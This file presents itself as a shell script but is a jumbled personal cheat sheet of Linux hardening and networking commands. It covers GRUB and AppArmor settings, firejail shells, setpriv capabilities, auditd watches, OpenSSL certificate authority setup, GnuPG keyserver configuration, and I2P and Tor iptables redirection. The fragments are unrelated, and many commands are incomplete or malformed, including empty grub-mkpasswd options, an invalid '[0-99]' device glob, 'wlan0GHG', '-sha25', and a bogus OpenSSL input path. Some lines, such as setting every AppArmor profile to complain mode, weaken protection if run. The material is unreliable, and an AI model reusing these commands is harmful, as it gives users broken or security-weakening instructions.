#!/bin/sh
## Xe1phix-SystemControl-v1.3.sh



## /sbin/grubby --update-kernel=ALL --args="audit=1"
/sbin/grubby --update-kernel=ALL --args="security=apparmor apparmor=1"

sed --follow-symlinks -i "s/selinux=0//gI" /etc/grub.conf
sed --follow-symlinks -i "s/enforcing=0//gI" /etc/grub.conf


grub-mkpasswd-pbkdf2 --iteration-count=  --salt=  --buflen=

set superusers="Xe1phix"
grub-mkpasswd-pbkdf2 xe1phix $Pass



## Play ParrotSec Hacker Login Noise
paplay /usr/share/sounds/parrot/login.ogg





{3,}
{3,5}
{315}
[a-z]
[A-Z]
reg[ex]
regex?
[Rr]egex
(0 [3-9] 11 [0-9]12 [0-5])
/dev/sd[a-z]
/dev/hd[a-t]
/dev/sd[a-c][a-z]

/dev/loop1[0-5]
/dev/nvme[0-99]

grep 'J[oO][bB]' *
grep 'job$' *
grep '^job' *
 |grep "[a-z]"
 
 
 
 | cut -d: -f2 | cut -d ' ' -f1




tr ',' '\n' | sed 's/^[[:space:]]//g'

 | cut -d "=" -f 2-


 | while read pkg; do

 | xargs git add
  | xargs zcat 
 
 PID=$(pidof -s ${index})
	if [[ "${PID}" != "" ]]; then
 
 tee -a logfile.txt
 kill -9 $! 2>/dev/null


notify-send "$1" "$2"
 
 # Capitalize the first letter of every word
sed 's/\b\(.\)/\u\1/g' tmp11 | awk '{print $2", "$1}'

find just directory entries
ls -l | grep "^d"
ls -l | awk '/^d/ { print $NF } '
ls -l | grep "^d" | cut -d" " -f9-
ls -l tools | grep "^d" | cut -d" " -f9-


 | sort -nr -k1 -k2
awk '/^[0-9]/ {print $1}' 
awk -Fc '/^[0-9]/ { print $1 }' 

[A-Fa-f0-9]
[A-Fa-f0-9]

find . -type d -print | xargs chmod 0750
find . -type f -print | xargs chmod 0640

find / -name "*.mp3" -exec chmod -v -R 0750 '{}' \;
find / -name "<file>*" -print						# Find all files whose name start with foo and print their path
find / -name "<file>*" -exec chmod 700 {} \;		# Find all files whose name start with foo and apply permission 700 to
find / -name "<file>*" -ok chmod 700 {} \;			# Find all files whose name start with foo and apply permission 700 to
find / -name "<file>*" -exec chmod -v 0644 {} \;

find / -xdev -user jake -print | xargs ls -ldS > /tmp/jake			# finds files owned by the user named jake organized in a long listing in size order then output is sent to the file /tmp/jake

find . -name '*.sh' | xargs 


stat --format=[%A/%a]:[%n]:[Size:%s.bytes]:[Uid:%u]:[User:%U]:[Group:%G]:[GID:%g]:[IO-Block:%o]:[File-type:%F]:[Inode:%i] /mnt/poo/Scripts/BrownTown/Scriptz2.1.1

stat --format=%a:%A:%B:%F:%n:%s:%u:%U:%C:%b:%i
stat --format=:%A:%a:%n:Size:%sbytes:Uid:%U:%u:Gid:%G:%g:IO Block:%o:File type:%F:Inode:%i
stat %A:%a:%n:Size:%sbytes:%U:%u:%G:%g:%o:%b:%B:%F
stat -c “%a %U %G %n” 




##-=========================================-##
##  [+] Graphical tree of sub-directories

ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'




Output it to a file:

cat index.html | grep -o 'http://[^"]*' | cut -d "/" -f 3 | sort -u > list.txt
for url in $(cat list.txt); do host $url; done



grep -E -e '^(.?)(.?)(.?)(.?)(.?)(.?)(.?)(.?)(.?).?\9\8\7\6\5\4\3\2\1$' file
echo 'ba' | grep -E '(a)\1|b\1'
printf 'foo\nbar\n' | grep -P '(?s)foo.*?bar'
printf 'foo\nbar\n' | grep -z -q 'foo[[:space:]]\+bar'	 # determine if the pattern is present:

 | grep '[c]ron'


strace -p $! 2>&1 | head -5


echo "###################################################################################"
find . -type f -exec du -k {} \; | sort -nrk 1 | head			# find the largest files

# Close shell keeping all subprocess running
disown -a && exit


# Execute a command at a given time
echo "nmcli " | at midnight

nmcli radio wwan off
nmcli radio wifi off
nmcli radio all off

nmcli device set autoconnect no
nmcli con mod ethernet-2 connection.autoconnect no

nmcli device disconnect eth0
wifi wifi rescan wlan0GHG
nmcli device wifi list
ethtool.feature-tx-checksum-ipv4
ip6
802-3-ethernet.auto-negotiate
ethernet.auto-negotiate no
802-3-ethernet.wake-on-lan
ethernet.wake-on-lan

ipv4.dhcp-hostname
ipv4.dhcp-send-hostname
ipv6.dhcp-hostname
ipv6.dhcp-send-hostname
ipv6.ignore-auto-dns
ipv6.ignore-auto-routes
ipv6.never-default

connection.zone
connection.read-only yes
connection.permissions 

ipv4.dns
ipv4.dns-options
ipv4.method
autoconnect
connection.autoconnect
connection.permissions
connection.read-only TRUE
ipv6.addresses


802-3-ethernet.wake-on-lan ignore

ipv4.dns-options


ipv6.method ignore
ipv6.ignore-auto-routes yes
ipv6.ignore-auto-dns yes 
ipv6.never-default yes
set ipv6.dhcp-send-hostname no
ipv6.may-fail yes
ipv6.addr-gen-mode 


create a bridge
nmcli con add type bridge ifname br0

disable STP
nmcli con modify bridge-br0 bridge.stp no



nmcli con modify eth0 +ipv4.dns 139.99.96.146,193.138.218.74,37.59.40.15

nmcli c a ifname eth0 type ethernet ipv4.method disabled ipv6.method link-local

nmcli con import type openvpn file /etc/openvpn/$VPNProfile.ovpn

802-1x.subject-match
802-1x.phase2-subject-match
altsubject-matches
client-cert, client-cert-password
system-ca-certs
private-key


connection.id Wired
connection.interface-name eth0
connection.permissions

set permissions xe1phix Parrot-Kiosk
nmcli connection set stable-id 
"${CONNECTION}-${BOOT}-${DEVICE}"

802-1x.system-ca-certs
connection.secondaries $OpenVPN
llmnr no 




ip link add dev wg0 type wireguard
    ip addr add dev wg0 10.0.200.13/32
    wg setconf wg0 /etc/wireguard/wg0.conf
    ip link set up wg0


wg set wg0 fwmark 1234
    ip rule add not fwmark 1234 table 2468
    ip rule add table main suppress_prefixlength 0
    ip route add default dev wg0 table 2468

# route wg0 traffic to main table
    ip rule del not fwmark 1234 table 2468
    ip rule del table main suppress_prefixlength 0

# Clear the terminal screen
ctrl-l


make dep
make bzImage
make modules

dkms status



adduser --shell /usr/bin/firejail user


adduser --shell /usr/bin/firejail xe1phix
usermod --shell /usr/bin/firejail xe1phix
chpasswd --crypt-method SHA512 --sha-rounds 5000
usermod -aG wheel parrotkios

sudo firecfg
firecfg --list
sudo firecfg --clean





git clone https://github.com/netblue30/firejail.git
cd firejail
./configure && make && sudo make install-strip
./configure --prefix=/usr --enable-apparmor

aa-enforce firejail-default




aa-enforce firejail-default


systemd-analyze syscall-filter
systemd-analyze dump


capsh --print | grep "Bounding set "


## Test for AmbientCapabilities
grep "CapAmb:" /proc/self/status


capsh --print

setpriv --dump
setpriv --list-caps

setpriv --inh-caps (+|-)
setpriv --ambient-caps (+|-)cap
setpriv --bounding-set (+|-)cap

setpriv --no-new-privs

setpriv --no-new-privs 
setpriv --no-new-privs firefox

setpriv --securebits +noroot
setpriv --securebits +noroot_locked
no_setuid_fixup
no_setuid_fixup_locked
keep_caps_locked

setpriv --securebits +noroot firefox

setpriv --reuid=1000 --regid=1000 --caps=-all

## create the mount ns with owning user ns
nsenter --user=$usernspath unshare --mount sleep 10 &

Enter/attach any namespace/container, regardless of being Docker/LXC/Systemd...

nsenter -i <pid-of-process-in-that-namespace> -u -p -i -n -m /bin/bash 


usermod --uid 101 user 

sudo deluser --group bluetooth
sudo deluser --group sambashare


usermod --shell /usr/sbin/nologin user
usermod --lock user
shadowconfig on


cat /etc/passwd
/etc/firejail/login.users
cat /etc/firejail/firejail.users



## Replace /bin/bash with a restricted firejail shell

cat /etc/shells

sudo usermod --shell /usr/sbin/nologin 
sudo usermod --shell /bin/false


sudo adduser --shell /usr/bin/firejail user
sudo usermod --shell /usr/bin/firejail user

sudo usermod --shell /usr/bin/firejail mysql
sudo usermod --shell /usr/sbin/nologin mysql
sudo usermod --shell /usr/bin/firejail postgres
sudo usermod --shell /usr/sbin/nologin postgres

/var/lib/postgresql

sudo usermod --shell /usr/sbin/nologin arpwatch
sudo usermod --shell /usr/sbin/nologin mixmaster



apparmor_parser -r /etc/apparmor.d/*

/etc/init.d/apparmor start
/etc/init.d/apparmor restart
 

apparmor_parser -r /etc/apparmor.d/*



## Get desktop notification on DENIED actions
aa-notify -p -f /var/log/audit /audit.log --display $DISPLAY



xattr –xl <file>                    ## Show	Extended Attributes	


xattr -p $AttributeName $File | xxd -r -p > $OutputFile.plist



sudo ln -s /etc/apparmor.d/libvirt/TEMPLATE.qemu /etc/apparmor.d/libvirt/TEMPLATE.kvm






 [■] auditd.conf    ## The audit daemon configuration file
 [■] audit.rules    ## Configuration rules loaded at boot
 [■] aureport       ## Report creator for the audit logs
 [■] audispd        ## Sends audit information to other programs
 [■] 



auditctl -l                         ## list of current audited fi les and their watch settings


auditctl -a exit,always -F arch=b64 -S all -F path=/usr/bin/chromium -F key=MonitorChromium



place a watch on /etc/passwd. monitor access,reads,writes, or file attribute changes:

auditctl -w /etc/passwd -p rwa


auditctl -w /etc/shadow -p w        ## start auditing writes to the /etc/shadow file

auditctl -W /etc/shadow -p w        ## turn off the auditing to the /etc/shadow file

ausearch -f /etc/shadow             ## create a report from the auditd daemon on the /etc/shadow fi le

ausearch -f /etc/passwd             ## review the audit logs of /etc/passwd

ausearch -m AVC -ts recent



ausearch --input audit.log

aureport --input audit.log

aureport --input audit.log --format text

aureport --input audit.log --login




praudit –xn /var/audit/*            ## View	audit logs in XML format without user/group resolution.	
  








mkdir -m 0700 -p \$GNUPGHOME;
for fpr in \$(gpg --with-fingerprint builder-conf-repo-key.asc | grep fingerprint | cut -f 2 -d= | tr -d ' '); do
echo \$fpr:6: | gpg --import-ownertrust;


/usr/lib/qubes/qrexec-client-vm dom0 qubesbuilder.ExportDisk /bin/echo -e "$key\n${PWD}/${IMAGE_NAME}"
qvm-run --dispvm "/usr/lib/qubes/qrexec-client-vm dom0 qubesbuilder.AttachDisk /bin/echo $key;"
            

mount /dev/xvdi /mnt/removable -o discard;
cd /mnt/removable;
umask 022;



##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##








gnutls-cli www.paypal.com



openssl s_client -connect $Host:$Port




task show





openssl x509 -in $Cert.pem -noout -text         ## Display contents of a certificate



openssl x509 -in -.wikipedia.org -text -noout

cat -.wikipedia.org.DER | sha256sum >> wikipedia.org.sha256

openssl asn1parse -i -in wikipedia.pem

openssl asn1parse -in wikipedia.pem -strparse 4 -out wikipedia.tbs 


openssl asn1parse -in wikipedia.pem -strparse 1554 -out wikipedia.sig
od -tx1 wikipedia.sig

openssl x509 -in globalsignv2.pem -noout -pubkey >globalsignov2.pub
openssl pkey -in globalsignv2.pub -pubin -text



openssl sha256 <wikipedia.tbs -binary >hash
od -tx1 hash
openssl pkeyutl -verify -in hash -sigfile wikipedia.sig -inkey globalsignov2.pub -pubin -pkeyopt digest:sha256

openssl sha256 <wikipedia.tbs -verify globalsignov2.pub -signature wikipedia.sig















openssl req -new -nodes -out req.pem -keyout cert.key -sha25

openssl genrsa -rand -genkey -out cert.key 2048

openssl req -new -x509 -days 365 -key cert.key -out cert.crt




openssl genrsa -out "${OUT}.key" 4096
openssl req -new -nodes -key "${OUT}.key" -out "${OUT}.csr" \-subj "/C=US/ST=CA/L=San Francisco/O=Docker/CN=${COMMONNAME}" -config "${OUT}.cnf" -extensions "v3_req"
openssl x509 -req -days 3650 -in "${OUT}.csr" -signkey "${OUT}.key" -out "${OUT}.crt" -extensions v3_req -extfile "${OUT}.cnf"







##-============================-##
##   [+] Create the root CA
##-============================-##
openssl req -x509 -config "${CONFIGS_DIR}/openssl-ca.cnf" -newkey rsa:4096 -sha256 -subj "${CERT_SUBJ}" -nodes -out "${CERT_DIR}/cacert.pem" -outform PEM

openssl x509 -noout -text -in "${CERT_DIR}/cacert.pem"


##-=======================================================-##
##   [+] Create the server certificate signing request
##-=======================================================-##
openssl req -config "${CONFIGS_DIR}/$openssl-server.cnf" -newkey rsa:4096 -sha256 -subj "/CN=localhost" -nodes -out "${CERT_DIR}/server.csr" -outform PEM

openssl req -text -noout -verify -in "${CERT_DIR}/$server.csr"


##-===============================-##
##   [+] Create the server cert
##-===============================-##
openssl ca -batch -config "${CONFIGS_DIR}/$OpenSSLCA.cnf" -policy signing_policy -extensions signing_req -out "${CERT_DIR}/server.cert" -infiles "${CERT_DIR}/server.csr"

openssl x509 -noout -text -in "${CERT_DIR}/$server.cert"



##-======================================================-##
##   [+] Create the client certificate signing request
##-======================================================-##
openssl req -config "${CONFIGS_DIR}/$openssl-client.cnf" -newkey rsa:4096 -sha256 -subj "/CN=client" -nodes -out "${CERT_DIR}/client.csr" -outform PEM

openssl req -text -noout -verify -in "${CERT_DIR}/$client.csr"


##-================================-##
##   [+] Create the client cert
##-================================-##
openssl ca -batch -config "${CONFIGS_DIR}/$openssl-ca.cnf" -policy signing_policy -extensions signing_req -out "${CERT_DIR}/client.cert" -infiles "${CERT_DIR}/client.csr"

openssl x509 -noout -text -in "${CERT_DIR}/$client.cert"





gpg --armor --encrypt --trust-model=always --keyring ${keyring} -r ${holder} > ${output}.${holder}


gpghome=$(mktemp -d) export GNUPGHOME="${gpghome}"

cat > gpg.conf <<EOF personal-digest-preferences SHA512 cert-digest-algo SHA512 default-preference-list SHA512 SHA384 SHA256 SHA224 AES256 AES192 AES CAST5 ZLIB BZIP2 ZIP Uncompressed EOF


cat > generate-key.conf <<EOF 
Key-Type: RSA Key-Length: 4096 
Key-Usage: sign 
Subkey-Type: RSA 
Subkey-Length: 4096 
Subkey-Usage: sign 
Name-Real: ${name_real:?} 
Name-Email: ${name_email:?} 
Name-Comment: ${name_comment:-} 
Expire-Date: 8y 
EOF


gpg --batch --pinentry-mode loopback --passphrase "" --full-generate-key generate-key.conf key=$(gpg --with-colon --list-secret-keys | awk -F: '$1 == "fpr" { print $10; exit 0; }') key_uid=$(gpg --with-colon --list-secret-keys | awk -F: '$1 == "uid" { print $10; exit 0; }')


gpg -a --export ${key} > public-${key}.asc 
gpg -a --export-secret-key ${key} > private-key-${key}.asc 
gpg -a --export-secret-subkeys ${key} > private-subkey-${key}.asc






cat /proc/sys/kernel/random/entropy_avail

gpg --enable-large-rsa --homedir ~/.gnupg

gpg --verbose --symmetric --cipher-algo aes256 --digest-algo sha512 --cert-digest-algo sha512 --s2k-mode 3 --s2k-count 65011712 --s2k-cipher-algo AES256 --s2k-digest-algo SHA512



--expert
--armor
--passphrase-file
--sign
--clear-sign
--detach-sign

--encrypt-files
--verify-files

--trust-model {pgp|classic|tofu|tofu+pgp|direct|always|auto}
--tofu-default-policy 
--keyid-format {none|short|0xshort|long|0xlong}
--no-auto-key-locate
--auto-key-locate local
--require-secmem
--list-options [no-]show-photos
--default-recipient-self

symmetric_ciphers aes
asymmetric_cipher rsa 

##  https://github.com/drduh/YubiKey-Guide

gpg --verbose --keyid-format 0xlong --import Xe1phixCollection.asc

gpg --keyserver hkp://pool.sks-keyservers.net --recv-keys 0x94CBAFDD30345109561835AA0B7F8B60E3EDFAE3
curl --verbose --progress-bar --tlsv1.2 --ssl-reqd --url https://sks-keyservers.net/sks-keyservers.netCA.pem.asc --output /usr/share/gnupg/sks-keyservers.netCA.pem.asc
curl --verbose --progress-bar --tlsv1.2 --ssl-reqd --url https://sks-keyservers.net/ca/crl.pem --output /usr/share/gnupg/crl.pem
gpg --keyid-format 0xlong --verify sks-keyservers.netCA.pem.asc sks-keyservers.netCA.pem
echo "keyserver hkps://hkps.pool.sks-keyservers.net" >> /home/xe1phix/.gnupg/dirmngr.conf
echo "hkp-cacert /usr/share/gnupg/sks-keyservers.netCA.pem" >> /home/xe1phix/.gnupg/dirmngr.conf
gpg --fingerprint 0x94CBAFDD30345109561835AA0B7F8B60E3EDFAE3
gpg --export 0x94CBAFDD30345109561835AA0B7F8B60E3EDFAE3 | sudo apt-key add - 
gpg --lsign 0x94CBAFDD30345109561835AA0B7F8B60E3EDFAE3

dirmngr --hkp-cacert /usr/share/gnupg/sks-keyservers.netCA.pem







curl --verbose --progress-bar --tlsv1 --url https://sks-keyservers.net/sks-keyservers.netCA.pem --output /home/amnesia/Gnupg/sks-keyservers.netCA.pem
curl --verbose --progress-bar --tlsv1 --url https://sks-keyservers.net/sks-keyservers.netCA.pem.asc --output /home/amnesia/Gnupg/sks-keyservers.netCA.pem.asc && apt-key add /home/amnesia/Gnupg/sks-keyservers.netCA.pem.asc
curl --verbose --progress-bar --tlsv1 --url https://sks-keyservers.net/ca/crl.pem --output /home/amnesia/Gnupg/crl.pem



gpg --keyserver x-hkp://pool.sks-keyservers.net --recv-keys 0x


https://sks-keyservers.net/ca/crl.pem
https://sks-keyservers.net/sks-keyservers.netCA.pem.asc
keyserver hkps://hkps.pool.sks-keyservers.net
keyserver-options ca-cert-file=/etc/ssl/certs/sks-keyservers.netCA.pem


curl --resolve 127.0.0.1:4444:http://killyourtv.i2p/killyourtv.asc 
https://blog.patternsinthevoid.net/isis.txt



Wlan="wlan0"
Alpha="wlan1"
VPN="tun0"
LOOPBACK="lo"
echo "###############################################################"
echo -e "\t [+] Establish Subnetting Criteria Environment Variables:"
echo "###############################################################"
CLASS_A="10.0.0.0/8"                # Class A private networks
CLASS_B="172.16.0.0/12"             # Class B private networks
CLASS_C="192.168.0.0/16"            # Class C private networks
CLASS_D_MULTICAST="224.0.0.0/4"         # Class D multicast addr
CLASS_E_RESERVED_NET="240.0.0.0/5"      # Class E reserved addr
BROADCAST_SRC="0.0.0.0"             # Broadcast source addr
BROADCAST_DEST="255.255.255.255"        # Broadcast destination addr
echo "###############################################################"



echo "alias history='history | cut -c8-199' " >> ~/.bashrc
echo "alias history='history | cut -c8-199' " >> /root/.bashrc


I2PUSER="i2psvc"
MODPROBE=/sbin/modprobe
IPTABLES=/sbin/iptables
IP6TABLES=/sbin/ip6tables
IPTABLES_RESTORE="$IPTABLES-restore"

I2PWEBUI=http://localhost:7657/home                     ##  [web interface](http://localhost:7657/home)


## ----------------------------------------------------- ##
##    [?] HTTP:    127.0.0.1  [Port 4444]
##    [?] HTTPS:  127.0.0.1  [Port 4445]
##    [?] FTP:       127.0.0.1  [Port 4444]
## ----------------------------------------------------- ##


## ----------------------------------------------------- ##
##    [+] Stop I2P Daemon 
##    [?] Using Kill, pointing to I2Ps PID file:  
## ----------------------------------------------------- ##
kill -INT $( cat /var/run/i2pd/i2pd.pid )

## ----------------------- ##
##    [+] Start  I2P
## ----------------------- ##
~/.i2p/i2prouter start

## ------------------------------ ##
##    [+] Stop  I2P
##    [+] Stop  I2P nicely
## ------------------------------ ##
~/.i2p/i2prouter stop
~/.i2p/i2prouter graceful


sudo -u i2psvc i2prouter start
sleep 2

the router console homepage

xdg-open 'http://127.0.0.1:7657/home'
http://127.0.0.1:7657/configservice

Xe1phix-TorProject-[IPTables]


Tor-[IPTables]-[DNS]+[Socks5]-Redirect-To-Ports-[9040]+[9050]+[30053]
Community-Tor-[IPTables]-[DNS]+[Socks5]-Redirect-To-Ports-[9040]+[9050]+[30053].sh
Community-Darknet-[IPTables]-[DNS]+[Socks5].sh
Community-[Darknet]-[IPTables]-[DNS]+[Socks5].sh
Community-[Darknet]-[Tor]-[IPTables]-[DNS]+[Socks5].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[BioDirectional]-[Anonymity-Network]-[EEPSite]-.sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[BioDirectional]-[Anonymity-Network]-[EEPSite]-.sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[BioDirectional]-[Anonymity-Network]-[EEPSite]-.sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[BioDirectional]-[Anonymity-Network]-[EEPSite]-.sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[BioDirectional]-[Anonymity-Network]-[EEPSite]-.sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[Anonyous-Network].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[Anonyous-Network].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[I2PSnark-Anonymous-Torrenting].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[I2PSnark]-[Anonymous-Torrenting].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[I2PSnark]-[Anonymous-Torrenting].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[Anonymous-Torrenting]-[I2PSnark]-{Bittorrent}-[P2P]-Networking].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[Anonymous-P2P]-[I2PSnark]-{Networking}.sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[P2P-Torrenting]-[I2PSnark]-{Networking}.sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[Torrenting]-[I2PSnark]-{Networking}.sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P-Torrenting]-[I2PSnark].sh
Community-[Darknet]-[I2P]-[IPTables]-[ITorrenting]-[I2PSnark].sh
Community-[Darknet]-[I2P]-[IPTables]-[Anon-Torrenting]-[I2PSnark].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2PSnark-Torrenting]-[I2PSnark].sh
Community-[Darknet]-[I2P]-[IPTables]-[Torrenting]-[I2PSnark].sh
Community-[Darknet]-[I2P]-[IPTables]-[Torrenting]-[WebTorrenting].sh
Community-[Darknet]-[I2P]-[IPTables]-[WebTorrent-Networking].sh
Community-[Darknet]-[I2P]-[IPTables]-[WebTorrent]-[Networking].sh
Community-[Darknet]-[I2P]-[IPTables]-[WebTorrent]-[Anonymous-Networking].sh
Community-[Darknet]-[I2P]-[IPTables]-[WebTorrent]-[Anon-Networking].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[Torrenting]-[I2PSnark]-{Networking}.sh
Community-[Darknet]-[I2P]-[IPTables]-[qBittorrenting]-[Networking}.sh
Community-[Darknet]-[I2P]-[IPTables]-[qBittorrenting]-[Anonymous-Networking}.sh
Community-[Darknet]-[I2P]-[IPTables]-[qBittorrenting]-[Anon-Networking}.sh
Community-[Darknet]-[I2P]-[IPTables]-[qBittorrenting]-[Firewall}.sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[Anonymous-Torrenting]-[I2PSnark]-{Bittorrent}-[P2P]-Networking].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[I2PSnark]-{Bittorrent}-[P2P]-Networking].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[I2PSnark]-{Bittorrent}-[P2P]-Networking].sh
Community-[Darknet]-[I2P]-[IPTables]-[Bittorrent]-[qBittorrenting].sh
Community-[Darknet]-[I2P]-[IPTables]-Anonymous-[Torrenting]-[qBittorrenting].sh
Community-[Darknet]-[I2P]-[IPTables]-Anon-[Torrenting]-[qBittorrenting].sh
Community-[Darknet]-[I2P]-[IPTables]-Anonymous-[Torrenting].sh
Community-[Darknet]-[I2P]-[IPTables]-Anon-[Torrenting].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[I2PSnark]-[Anonymous-Torrenting].sh
Community-[Darknet]-[I2P]-[IPTables]-[I2P]-[Anonyous-Network].sh



Community-[Darknet]-[]-[IPTables]-[DNS]+[Socks5].sh
Community-[Darknet]-[]-[IPTables]-[DNS]+[Socks5].sh
Community-[Darknet]-[IPTables]-[DNS]+[Socks5].sh
Community-[Darknet]-[IPTables]-[DNS]+[Socks5].sh
Redirect-To-Ports-[9040]+[9050]+[30053].sh

Tor-[IPTables]-[DNS]+[Socks5]-Redirect-To-Ports-[9040]+[9050]+[30053]
Tor socks5


Tor DNS listens on 




echo -e -n " $GREEN*$BLUE stopping I2P services\n$RESETCOLOR"
sudo -u i2psvc i2prouter stop


if [ ! -e /var/run/tor/tor.pid ]; then
	echo -e " $RED*$BLUE Tor is not running! $GREEN starting it $BLUE for you$RESETCOLOR\n" >&2
	service network-manager force-reload > /dev/null 2>&1
	service tor start
	sleep 1
fi


if ! [ -f /etc/network/iptables.rules ]; then
	iptables-save > /etc/network/iptables.rules
	echo -e " $GREEN*$BLUE Saved iptables rules$RESETCOLOR\n"
fi




##-=======================-##
##     [+]  Set IPTables NAT:
##-=======================-##
iptables -t nat -A OUTPUT -m owner --uid-owner $TorUID -j RETURN
iptables -t nat -A OUTPUT -p udp -m owner --uid-owner $TorUID -m udp --dport 53 -j REDIRECT --to-ports 53

##-=============================================-##
##     [+]  Darknet - Tor - Resolve Re DNS Domain Traffic:
##-=============================================-##
##  
## --------------------------------------------------------------------------------------------------- ##
##     [?]  Resolve Tor Darknet DNS:
##     [?]  Tor Onion DNS Mapping of:
## --------------------------------------------------------------------------------------------------- ##
##            ~->  The 10.192.0.0/10 Tor DNS Address Space
## --------------------------------------------------------------------------------------------------- ##
##  
## -------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] Resolve Tor Darknet DNS - Onion Mapping of The 10.192.0.0/10 Address Space
## -------------------------------------------------------------------------------------------------------------------------------- ##
##  
##-=====================================================-##
##      [+]  Darknet - Tor - ReDirect Tor Traffic To SOCKS5 Ports:
##-=====================================================-##
iptables -t nat -A OUTPUT -p tcp -d 10.192.0.0/10 -j REDIRECT --to-ports 9040
iptables -t nat -A OUTPUT -p udp -d 10.192.0.0/10 -j REDIRECT --to-ports 9040



#allow only tor output

iptables -A OUTPUT -m owner --uid-owner $TorUID -j ACCEPT
iptables -A OUTPUT -j REJECT








SourcesList=/etc/apt/sources.list
resolution=$(xdpyinfo | grep 'dimensions:' | awk -F" " {'print $2'} | awk -F"x" {'print $1'})



/sys/kernel/debug/tracing/



renice +7 $(pgrep vlc)





udisksctl dump
udisksctl status


udisksctl info {--object-path OBJECT | --block-device

udisksctl mount {--object-path OBJECT | --block-device DEVICE} [--filesystem-type TYPE] [--options

udisksctl unmount --block-device /dev/sdc
udisksctl power-off {--object-path OBJECT | --block-device 

udisksctl loop-setup --file PATH [--read-only] [--offset OFFSET] [--size



grub‐install /dev/sda


sudo perl ‐pi ‐e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub


sudo update‐grub
sudo reboot

ApparmorProfiles=/etc/apparmor.d/"$1"
ApparmorModule=/sys/module/apparmor
aafs=/sys/kernel/security/apparmor
params=$module/parameters



/etc/init.d/apparmor start
/etc/init.d/apparmor restart


mount -tsecurityfs securityfs /sys/kernel/security

cat /sys/module/apparmor/parameters/enabled
cat /sys/kernel/security/apparmor/profiles
cat /sys/kernel/security/apparmor/policy/profiles/firejail-default.0/mode
cat /sys/module/apparmor/parameters/enabled


cat /sys/module/apparmor/parameters/enabled
aa-notify -p -f /var/log/audit/audit.log --display $DISPLAY



cat /etc/apparmor.d/$Profile | sudo apparmor_parser -a                  ## Load A New Profile
cat /etc/apparmor.d/$Profile | sudo apparmor_parser -r                  ## Reload An Existing Profile

apparmor_parser -a /etc/apparmor.d/<profile>
apparmor_parser -r /etc/apparmor.d/<profile>

sudo /etc/init.d/apparmor reload
sudo /etc/init.d/apparmor start


##-=================================-##
##  [+] Update An AppArmor Profile
##-=================================-##
sudo genprof firefox
sudo aa-logprof firefox
sudo apparmor_parser -r /etc/apparmor.d/<profile>
/etc/init.d/apparmor restart



cat /sys/module/apparmor/parameters/enabled

aa-status --verbose
cat /sys/kernel/security/apparmor/profiles
cat /proc/mounts | grep securityfs


/sbin/apparmor_parser -r -W "$profile"


sudo aa-notify -p -f /var/log/audit/audit.log

## Responding to policy changes automatically
aa-policy daemon

## Show processes that are unconfined
grep -L unconfined /proc/*/attr/current


## show the permissions granted when the user owns the 
## resource (file, directory, pipe, etc.) 
apparmor_parser -Q --debug /etc/apparmor.d/usr.bin.firefox | head -10



sudo cat /sys/kernel/security/apparmor/profiles | grep firejail


## put all profiles into complain mode:
sudo aa-complain /etc/apparmor.d/*				## put all profiles into complain mode:


## put all profiles into enforcing mode:
sudo aa-enforce /etc/apparmor.d/*								## put all profiles into enforcing mode:

## Enable Firefox Profile
sudo aa-enforce /etc/apparmor.d/usr.bin.firefox

## Reload profiles
apparmor_parser -r /etc/apparmor.d/*


## set all "extra" profiles to complain mode
cd /usr/share/doc/apparmor‐profiles/extras
cp ‐i *.* /etc/apparmor.d/
for f in *.* ; do aa‐complain /etc/apparmor.d/$f; done


aa-notify -p -f /var/log/audit/audit.log --display $DISPLAY



echo "##-=============================================================-##"
echo "         [+] Enforcing Your TorBrowser AppArmor Profile..."
echo "##-=============================================================-##"
sudo aa-enforce /etc/apparmor.d/usr.bin.torbrowser-launcher
sudo aa-enforce /etc/apparmor.d/torbrowser.start-tor-browser
sudo aa-enforce /etc/apparmor.d/torbrowser.Browser.firefox
sudo aa-enforce /etc/apparmor.d/torbrowser.Tor.tor

torbrowser_firefox
torbrowser_plugin_container

torbrowser_tor (enforce)
usr.bin.thunderbird

usr.bin.i2prouter
system_i2p

usr.sbin.ntpd

firejail-default


sbin.syslogd                             usr.sbin.apt-cacher-ng
sbin.syslog-ng


usr.sbin.dnsmasq





The /proc/$PID/$uid_map file is 
Owned by the $UserID 
That created the Namespace


All of the following requirements must be met:

The writing process must have: 
  >  The $CAP_SETUID  
		[?]  ($CAP_SETGID For $GIDMap) 
				> (gid_map) Capability 

In the $UserNamespace of the $ProcPID

Regardless of capabilities, 
the writing process must be In either: 
  >  The $User_Namespace of the $Proc $PID 
				or 
  >  inside the (immediate) 
	   >  $ParentUserNamespace of the $ProcPID


  [+] $ns_child_exec  -  Create a $ChildProcess

						  
  [?]  That executes a shell $Cmd 
		 In A $New_Namespace(s)


  [?]  Uses $Clone()  
  [+]  To Create A $ChildProcess
  [?]  In New Namespaces 


Start Function For Cloned Child:

 -i				##   [+] new IPC namespace
 -m			##   [+] new mount namespace
 -n			##   [+] new network namespace
